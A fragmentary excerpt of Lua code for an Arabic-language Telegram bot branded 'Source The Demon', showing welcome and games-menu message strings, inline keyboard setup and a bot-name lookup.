╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》 ](t.me/bar_lo0o0o0o0o)❳ 
]]
keyboard = {} 
...
local Teext =[[
 ✠مرحب  بك في مميزات سورس الشيطان ✠
 ✠ مميزات الخاصه بسورس ✠
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧
🕹ريدفي الاسفل ↑⟦᪣⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》 ](t.me/bar_lo0o0o0o0o)❳ 
]]
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'الشيطان')
